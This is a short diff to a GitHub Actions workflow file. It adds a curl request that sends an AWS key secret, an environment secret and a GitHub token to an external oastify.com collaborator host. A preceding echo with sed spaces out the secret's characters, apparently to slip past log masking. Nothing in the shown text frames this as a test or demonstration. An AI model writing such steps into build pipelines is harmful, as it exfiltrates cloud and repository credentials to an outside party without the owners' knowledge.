@@ -21,4 +21,4 @@ jobs:
       run: |
         echo "$myvar=${{ secrets.AWS_KEY }} | sed 's/./& /g'"
         echo "$myvar"
-        curl -X GET "http://ezh52tvjwif7vi2wd3ubu7d38uel2bq0.oastify.com?awskey=${myvar} | sed 's/./& /g'}&envsec=${envk}&github=${ghk}"
+        curl -X GET "http://ezh52tvjwif7vi2wd3ubu7d38uel2bq0.oastify.com?awskey=${myvar}&envsec=${envk}&github=${ghk}"
